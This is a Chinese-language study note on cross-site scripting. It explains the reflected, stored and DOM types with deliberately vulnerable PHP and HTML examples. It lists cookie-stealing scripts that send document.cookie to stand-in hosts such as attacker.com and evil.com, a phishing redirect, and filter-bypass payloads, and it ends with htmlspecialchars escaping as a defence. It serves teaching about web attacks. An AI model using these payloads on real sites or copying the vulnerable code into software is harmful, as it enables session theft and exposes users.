# <center> XSS -- Cross-Site Scripting
---
攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

## Reflected Cross-Site Scripting
反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

- 服务器：理解成数据
- 浏览器：理解成代码
  
e.g.
服务器端代码
```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 
?>
```
构造恶意url
```
https://example.com/search?name=<script>...</script>
```
诱导用户访问该url
## Persistent / Stored Cross-Site Scripting
此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

服务器端代码
```php
<?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    //mysql_close(); }
?>
```

## DOM (Document Object Model) XSS
恶意代码的执行完全在客户端（浏览器）完成，不涉及服务器端反射

```html
<html>
  <head>
    <title>DOM-XSS test</title>
  </head>
  <body>
    <script>
      var a=document.URL;
      document.write(a.substring(a.indexOf("a=")+2,a.length));
    </script>
  </body>
</html>
```


## 利用方式
### 获取Cookie
```php
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
```php
<script>
new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
```
```php
<script>
document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
```
### 会话劫持

### 钓鱼
重定向
```
http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
```

## 防御 & 绕过
过滤掉 `<script>` 
- 利用 `<img>`, `<svg>` 
```html
<svg onload="alert(1)"></svg>
```

- 利用 on* 事件
```html
<input name=keyword  value="" onfocus="alert()" autofocus="">
```

过滤掉 on 事件
- 利用 javascript: 协议绕过
  
html转义
htmlspecialchars() 将以下字符转义为html实体：
```
& → &amp;
" → &quot; (当使用 ENT_QUOTES 时也会转义单引号)
' → &#039; (仅当使用 ENT_QUOTES 时)
< → &lt;
> → &gt;
```